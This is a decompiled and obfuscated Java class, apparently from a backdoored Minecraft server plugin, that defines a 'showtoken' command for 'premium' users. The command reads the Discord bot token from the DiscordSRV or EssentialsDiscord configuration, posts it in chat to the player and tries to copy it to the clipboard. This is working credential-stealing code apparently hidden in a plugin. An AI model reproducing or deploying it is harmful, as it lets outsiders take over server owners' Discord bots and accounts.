/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.configuration.file.YamlConfiguration
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.Settings;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class ShowtokenCommand
extends Command {
    public ShowtokenCommand() {
        ShowtokenCommand lllllllllllllllIIlIlllIllIIIlIlI;
    }

    @Override
    public void execute(Core lllllllllllllllIIlIlllIlIlllIIlI, String lllllllllllllllIIlIlllIlIlllIlIl, String[] lllllllllllllllIIlIlllIlIlllIlII, Player lllllllllllllllIIlIlllIlIlllIIll) {
        if (lllllllllllllllIIlIlllIlIlllIIlI.premium.contains(lllllllllllllllIIlIlllIlIlllIIll.getName())) {
            if (PluginUtils.getPluginByName("DiscordSRV") == null) {
                lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX("This server does not have DiscordSRV"));
                if (PluginUtils.getPluginByName("EssentialsDiscord") == null) {
                    lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX("This server does not have EssentialsDiscord"));
                } else {
                    File lllllllllllllllIIlIlllIllIIIIIIl = new File(String.valueOf(new StringBuilder().append(PluginUtils.getPluginByName("EssentialsDiscord").getDataFolder()).append("/config.yml")));
                    YamlConfiguration lllllllllllllllIIlIlllIllIIIIIII = YamlConfiguration.loadConfiguration((File)lllllllllllllllIIlIlllIllIIIIIIl);
                    lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX(lllllllllllllllIIlIlllIllIIIIIII.getString("token")));
                    lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX("Token was also attempted to be copied to your clipboard."));
                    Toolkit lllllllllllllllIIlIlllIlIlllllll = Toolkit.getDefaultToolkit();
                    Clipboard lllllllllllllllIIlIlllIlIllllllI = lllllllllllllllIIlIlllIlIlllllll.getSystemClipboard();
                    StringSelection lllllllllllllllIIlIlllIlIlllllIl = new StringSelection(lllllllllllllllIIlIlllIllIIIIIII.getString("token"));
                    lllllllllllllllIIlIlllIlIllllllI.setContents(lllllllllllllllIIlIlllIlIlllllIl, null);
                    lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX("Try clicking the token in chat to copy it!"));
                }
            } else {
                File lllllllllllllllIIlIlllIlIlllllII = new File(String.valueOf(new StringBuilder().append(PluginUtils.getPluginByName("DiscordSRV").getDataFolder()).append("/config.yml")));
                YamlConfiguration lllllllllllllllIIlIlllIlIllllIll = YamlConfiguration.loadConfiguration((File)lllllllllllllllIIlIlllIlIlllllII);
                lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX(lllllllllllllllIIlIlllIlIllllIll.getString("BotToken")));
                lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX("Token was also attempted to be copied to your clipboard"));
                Toolkit lllllllllllllllIIlIlllIlIllllIlI = Toolkit.getDefaultToolkit();
                Clipboard lllllllllllllllIIlIlllIlIllllIIl = lllllllllllllllIIlIlllIlIllllIlI.getSystemClipboard();
                StringSelection lllllllllllllllIIlIlllIlIllllIII = new StringSelection(lllllllllllllllIIlIlllIlIllllIll.getString("BotToken"));
                lllllllllllllllIIlIlllIlIllllIIl.setContents(lllllllllllllllIIlIlllIlIllllIII, null);
                lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX("Try clicking the token in chat to copy it!"));
            }
        } else {
            lllllllllllllllIIlIlllIlIlllIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

